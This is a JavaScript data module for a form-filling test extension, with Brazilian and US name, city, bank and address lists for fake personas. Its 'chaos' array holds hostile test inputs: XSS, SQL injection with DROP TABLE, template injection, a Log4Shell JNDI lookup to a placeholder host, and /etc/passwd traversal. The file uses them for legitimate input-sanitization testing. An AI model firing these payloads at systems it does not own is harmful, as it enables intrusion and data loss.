/**
 * Web Copilot — bases de dados locais (pt-BR e en-US).
 *
 * Tudo offline e sem dependência externa: a extensão nunca faz request para
 * gerar dado. Cidade carrega DDD e faixa de CEP juntos porque a persona
 * precisa ser coerente — telefone (11) com CEP de Fortaleza reprova em
 * qualquer validação séria de cadastro.
 */
(function (root) {
  "use strict";

  var WC = (root.WC = root.WC || {});

  var BR = {};

  BR.firstNamesM = [
    "João", "José", "Pedro", "Lucas", "Carlos", "Rafael", "Bruno", "Gabriel", "Felipe", "Rodrigo",
    "Marcelo", "Thiago", "Gustavo", "Eduardo", "Vinícius", "André", "Fernando", "Leonardo", "Matheus", "Ricardo",
    "Antônio", "Paulo", "Diego", "Alexandre", "Daniel", "Fábio", "Henrique", "Igor", "Murilo", "Otávio"
  ];

  BR.firstNamesF = [
    "Maria", "Ana", "Paula", "Mariana", "Fernanda", "Juliana", "Camila", "Beatriz", "Larissa", "Amanda",
    "Patrícia", "Aline", "Carolina", "Letícia", "Bruna", "Gabriela", "Renata", "Vanessa", "Débora", "Priscila",
    "Luciana", "Isabela", "Natália", "Tatiane", "Cristiane", "Sandra", "Helena", "Clara", "Manuela", "Sofia"
  ];

  BR.lastNames = [
    "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes",
    "Costa", "Ribeiro", "Martins", "Carvalho", "Almeida", "Barbosa", "Rocha", "Dias", "Nascimento", "Araújo",
    "Monteiro", "Cardoso", "Correia", "Teixeira", "Moreira", "Cavalcanti", "Azevedo", "Freitas", "Pinheiro", "Vieira"
  ];

  /**
   * cep guarda os 3 primeiros dígitos (a região postal real); os outros 5
   * são sorteados. ddd é o código de área principal do município.
   */
  BR.cities = [
    { city: "São Paulo", state: "SP", ddd: "11", cep: "010", ibge: "3550308" },
    { city: "Guarulhos", state: "SP", ddd: "11", cep: "070", ibge: "3518800" },
    { city: "Campinas", state: "SP", ddd: "19", cep: "130", ibge: "3509502" },
    { city: "Santos", state: "SP", ddd: "13", cep: "110", ibge: "3548500" },
    { city: "Ribeirão Preto", state: "SP", ddd: "16", cep: "140", ibge: "3543402" },
    { city: "Rio de Janeiro", state: "RJ", ddd: "21", cep: "205", ibge: "3304557" },
    { city: "Niterói", state: "RJ", ddd: "21", cep: "240", ibge: "3303302" },
    { city: "Campos dos Goytacazes", state: "RJ", ddd: "22", cep: "280", ibge: "3301009" },
    { city: "Belo Horizonte", state: "MG", ddd: "31", cep: "301", ibge: "3106200" },
    { city: "Uberlândia", state: "MG", ddd: "34", cep: "384", ibge: "3170206" },
    { city: "Juiz de Fora", state: "MG", ddd: "32", cep: "360", ibge: "3136702" },
    { city: "Curitiba", state: "PR", ddd: "41", cep: "800", ibge: "4106902" },
    { city: "Londrina", state: "PR", ddd: "43", cep: "860", ibge: "4113700" },
    { city: "Maringá", state: "PR", ddd: "44", cep: "870", ibge: "4115200" },
    { city: "Florianópolis", state: "SC", ddd: "48", cep: "880", ibge: "4205407" },
    { city: "Joinville", state: "SC", ddd: "47", cep: "892", ibge: "4209102" },
    { city: "Blumenau", state: "SC", ddd: "47", cep: "890", ibge: "4202404" },
    { city: "Porto Alegre", state: "RS", ddd: "51", cep: "900", ibge: "4314902" },
    { city: "Caxias do Sul", state: "RS", ddd: "54", cep: "950", ibge: "4305108" },
    { city: "Pelotas", state: "RS", ddd: "53", cep: "960", ibge: "4314407" },
    { city: "Salvador", state: "BA", ddd: "71", cep: "400", ibge: "2927408" },
    { city: "Feira de Santana", state: "BA", ddd: "75", cep: "440", ibge: "2910800" },
    { city: "Fortaleza", state: "CE", ddd: "85", cep: "600", ibge: "2304400" },
    { city: "Recife", state: "PE", ddd: "81", cep: "500", ibge: "2611606" },
    { city: "Olinda", state: "PE", ddd: "81", cep: "530", ibge: "2609600" },
    { city: "Brasília", state: "DF", ddd: "61", cep: "700", ibge: "5300108" },
    { city: "Goiânia", state: "GO", ddd: "62", cep: "740", ibge: "5208707" },
    { city: "Manaus", state: "AM", ddd: "92", cep: "690", ibge: "1302603" },
    { city: "Belém", state: "PA", ddd: "91", cep: "660", ibge: "1501402" },
    { city: "São Luís", state: "MA", ddd: "98", cep: "650", ibge: "2111300" },
    { city: "Natal", state: "RN", ddd: "84", cep: "590", ibge: "2408102" },
    { city: "João Pessoa", state: "PB", ddd: "83", cep: "580", ibge: "2507507" },
    { city: "Maceió", state: "AL", ddd: "82", cep: "570", ibge: "2704302" },
    { city: "Aracaju", state: "SE", ddd: "79", cep: "490", ibge: "2800308" },
    { city: "Teresina", state: "PI", ddd: "86", cep: "640", ibge: "2211001" },
    { city: "Cuiabá", state: "MT", ddd: "65", cep: "780", ibge: "5103403" },
    { city: "Campo Grande", state: "MS", ddd: "67", cep: "790", ibge: "5002704" },
    { city: "Vitória", state: "ES", ddd: "27", cep: "290", ibge: "3205309" },
    { city: "Porto Velho", state: "RO", ddd: "69", cep: "768", ibge: "1100205" },
    { city: "Palmas", state: "TO", ddd: "63", cep: "770", ibge: "1721000" },
    { city: "Macapá", state: "AP", ddd: "96", cep: "689", ibge: "1600303" },
    { city: "Boa Vista", state: "RR", ddd: "95", cep: "693", ibge: "1400100" },
    { city: "Rio Branco", state: "AC", ddd: "68", cep: "699", ibge: "1200401" }
  ];

  BR.states = [
    { sigla: "AC", nome: "Acre" }, { sigla: "AL", nome: "Alagoas" }, { sigla: "AP", nome: "Amapá" },
    { sigla: "AM", nome: "Amazonas" }, { sigla: "BA", nome: "Bahia" }, { sigla: "CE", nome: "Ceará" },
    { sigla: "DF", nome: "Distrito Federal" }, { sigla: "ES", nome: "Espírito Santo" }, { sigla: "GO", nome: "Goiás" },
    { sigla: "MA", nome: "Maranhão" }, { sigla: "MT", nome: "Mato Grosso" }, { sigla: "MS", nome: "Mato Grosso do Sul" },
    { sigla: "MG", nome: "Minas Gerais" }, { sigla: "PA", nome: "Pará" }, { sigla: "PB", nome: "Paraíba" },
    { sigla: "PR", nome: "Paraná" }, { sigla: "PE", nome: "Pernambuco" }, { sigla: "PI", nome: "Piauí" },
    { sigla: "RJ", nome: "Rio de Janeiro" }, { sigla: "RN", nome: "Rio Grande do Norte" }, { sigla: "RS", nome: "Rio Grande do Sul" },
    { sigla: "RO", nome: "Rondônia" }, { sigla: "RR", nome: "Roraima" }, { sigla: "SC", nome: "Santa Catarina" },
    { sigla: "SP", nome: "São Paulo" }, { sigla: "SE", nome: "Sergipe" }, { sigla: "TO", nome: "Tocantins" }
  ];

  BR.streetTypes = ["Rua", "Avenida", "Travessa", "Alameda", "Praça", "Estrada", "Rodovia"];

  BR.streetNames = [
    "das Flores", "Sete de Setembro", "XV de Novembro", "Brasil", "São João", "das Palmeiras",
    "Dom Pedro II", "Santos Dumont", "Getúlio Vargas", "Tiradentes", "das Acácias", "Marechal Deodoro",
    "Rio Branco", "Presidente Vargas", "João Pessoa", "Duque de Caxias", "Santa Rita", "das Orquídeas",
    "Nossa Senhora de Fátima", "Independência", "Bela Vista", "dos Ipês", "Paraná", "Amazonas"
  ];

  BR.neighborhoods = [
    "Centro", "Jardim América", "Vila Nova", "Boa Vista", "Bela Vista", "Santa Mônica", "Cidade Nova",
    "Jardim Paulista", "Vila Mariana", "São José", "Parque Industrial", "Alto da Glória", "Campo Belo",
    "Santo Antônio", "Jardim Europa", "Vila Rica", "Nova Esperança", "Morumbi", "Ipiranga", "Cristo Rei"
  ];

  BR.complements = ["Apto 101", "Apto 302 Bloco B", "Casa 2", "Fundos", "Sala 4", "Cobertura", "Térreo", ""];

  BR.companyPrefixes = ["Alfa", "Nova", "Prime", "Vetor", "Órion", "Aurora", "Delta", "Horizonte", "Íris", "Zênite", "Atlas", "Vertex"];
  BR.companyCores = ["Tech", "Log", "Med", "Agro", "Bank", "Data", "Farma", "Metal", "Casa", "Rede", "Solar", "Vida"];
  BR.companySegments = ["Comércio", "Serviços", "Tecnologia", "Indústria", "Soluções", "Consultoria", "Logística", "Participações"];
  BR.companyLegal = ["LTDA", "ME", "EIRELI", "S.A.", "EPP"];

  BR.jobTitles = [
    "Desenvolvedor de Software", "Analista de Sistemas", "Analista de Qualidade", "Gerente de Projetos",
    "Designer de Produto", "Analista Financeiro", "Assistente Administrativo", "Engenheiro de Dados",
    "Coordenador Comercial", "Analista de Marketing", "Especialista em Suporte", "Arquiteto de Soluções",
    "Advogado", "Contador", "Enfermeiro", "Professor", "Vendedor", "Motorista", "Nutricionista", "Fisioterapeuta"
  ];

  BR.departments = ["Tecnologia", "Financeiro", "Comercial", "Recursos Humanos", "Operações", "Marketing", "Jurídico", "Suporte", "Qualidade"];

  /** Bancos com código Febraban — usado em campos de banco/agência/conta. */
  BR.banks = [
    { code: "001", name: "Banco do Brasil" },
    { code: "033", name: "Santander" },
    { code: "104", name: "Caixa Econômica Federal" },
    { code: "237", name: "Bradesco" },
    { code: "341", name: "Itaú Unibanco" },
    { code: "260", name: "Nu Pagamentos" },
    { code: "077", name: "Banco Inter" },
    { code: "336", name: "Banco C6" },
    { code: "212", name: "Banco Original" },
    { code: "748", name: "Sicredi" },
    { code: "756", name: "Sicoob" },
    { code: "422", name: "Banco Safra" }
  ];

  BR.maritalStatus = ["Solteiro(a)", "Casado(a)", "Divorciado(a)", "Viúvo(a)", "União estável"];
  BR.education = ["Ensino Fundamental", "Ensino Médio", "Ensino Superior", "Pós-graduação", "Mestrado", "Doutorado"];
  BR.genders = ["Masculino", "Feminino", "Outro", "Prefiro não informar"];
  BR.bloodTypes = ["A+", "A-", "B+", "B-", "AB+", "AB-", "O+", "O-"];
  BR.colors = ["Preto", "Branco", "Prata", "Vermelho", "Azul", "Cinza", "Verde", "Amarelo"];
  BR.carBrands = [
    { brand: "Volkswagen", models: ["Gol", "Polo", "T-Cross", "Virtus"] },
    { brand: "Fiat", models: ["Argo", "Mobi", "Toro", "Strada"] },
    { brand: "Chevrolet", models: ["Onix", "Tracker", "Spin", "S10"] },
    { brand: "Toyota", models: ["Corolla", "Yaris", "Hilux", "Corolla Cross"] },
    { brand: "Honda", models: ["Civic", "Fit", "HR-V", "City"] },
    { brand: "Hyundai", models: ["HB20", "Creta", "Tucson"] }
  ];

  BR.products = [
    "Cadeira Ergonômica", "Notebook 14 polegadas", "Fone Bluetooth", "Teclado Mecânico", "Monitor 27\"",
    "Mesa de Escritório", "Câmera Web HD", "Mochila Antifurto", "Caneca Térmica", "Luminária de Mesa"
  ];

  /** Vocabulário para lorem em português — texto fake em latim confunde revisão de UX. */
  BR.words = [
    "acesso", "cadastro", "cliente", "compra", "conta", "dados", "entrega", "equipe", "empresa", "endereço",
    "fatura", "formulário", "gestão", "informação", "loja", "pagamento", "pedido", "plano", "processo", "produto",
    "projeto", "relatório", "serviço", "sistema", "suporte", "usuário", "validação", "venda", "prazo", "contrato",
    "documento", "proposta", "solicitação", "atendimento", "integração", "cadência", "registro", "protocolo"
  ];

  /**
   * Domínios .invalid e .test são reservados por RFC 2606/6761: nunca resolvem,
   * então nenhum e-mail de verificação escapa para a caixa de uma pessoa real.
   */
  BR.emailDomains = ["webcopilot.invalid", "teste.invalid", "qa.test", "exemplo.invalid", "sandbox.invalid"];

  var US = {
    firstNamesM: ["James", "John", "Michael", "David", "Chris", "Daniel", "Matthew", "Andrew", "Joshua", "Ryan"],
    firstNamesF: ["Mary", "Jennifer", "Linda", "Sarah", "Jessica", "Emily", "Ashley", "Amanda", "Megan", "Laura"],
    lastNames: ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Wilson", "Moore", "Taylor"],
    cities: [
      { city: "New York", state: "NY", zip: "100", area: "212" },
      { city: "Los Angeles", state: "CA", zip: "900", area: "213" },
      { city: "Chicago", state: "IL", zip: "606", area: "312" },
      { city: "Houston", state: "TX", zip: "770", area: "713" },
      { city: "Phoenix", state: "AZ", zip: "850", area: "602" },
      { city: "Seattle", state: "WA", zip: "981", area: "206" },
      { city: "Miami", state: "FL", zip: "331", area: "305" },
      { city: "Boston", state: "MA", zip: "021", area: "617" }
    ],
    streetTypes: ["Street", "Avenue", "Boulevard", "Road", "Lane", "Drive"],
    streetNames: ["Main", "Oak", "Maple", "Cedar", "Pine", "Elm", "Washington", "Lincoln", "Park", "Lake"],
    emailDomains: ["webcopilot.invalid", "example.invalid", "qa.test"]
  };

  /**
   * Cargas de estresse para o modo caos: testam sanitização, escaping e limites
   * de tamanho no SEU formulário. São strings inertes — quem precisa se defender
   * delas é o backend, e é justamente isso que se quer descobrir antes do deploy.
   */
  BR.chaosPayloads = [
    "<script>alert(1)</script>",
    "\" onmouseover=\"alert(1)",
    "' OR '1'='1",
    "'; DROP TABLE usuarios; --",
    "{{7*7}}",
    "${jndi:ldap://exemplo.invalid/a}",
    "../../../../etc/passwd",
    "%00nulo",
    "​zero​width​",
    "‮ROTATED‬",
    "🙂🚀🇧🇷 emoji no meio do texto 🧪",
    "ÁÉÍÓÚ àèìòù ÇÑ ü — acentuação pesada",
    "   espaços   sobrando   ",
    "\t\ttabs\te\nquebra\nde\nlinha",
    "٣٤٥ árabe-índico",
    "汉字测试文本",
    "-1",
    "0",
    "9".repeat(300),
    "A".repeat(1024),
    "NULL",
    "undefined",
    "%s %d %n"
  ];

  WC.datasets = { BR: BR, US: US };

  if (typeof module !== "undefined" && module.exports) module.exports = WC.datasets;
})(typeof window !== "undefined" ? window : typeof self !== "undefined" ? self : globalThis);
